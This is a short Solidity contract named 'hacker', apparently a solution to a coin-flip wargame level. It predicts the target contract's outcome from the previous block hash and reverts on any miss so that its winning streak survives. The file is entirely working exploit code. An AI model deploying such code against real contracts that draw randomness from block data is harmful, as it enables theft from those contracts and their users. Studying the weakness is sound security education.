// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IFlipCoin {
  function flip(bool) external returns (bool);
}

contract hacker {
    uint256 immutable FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    address targetContract;
    // Deploy with address of your target contract.
    constructor(address _targetContract) public {
        targetContract = _targetContract;
    }

    function attempt() public{
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool guess = coinFlip == 1;
        bool result = IFlipCoin(targetContract).flip(guess);

        /*
            In case, the guess is miscalculated due to difference in
            block.number (very rare), the target contract will return
            false result and set consecutive wins to zero. However, our
            hacker contract will revert the whole transaction. This will
            also revert the consecutiveWins in hacker contract from zero
            to previous position resulting in prevention of loss of 
            consecutive wins.
        */
        if(!result){
            revert();
        }
    }
}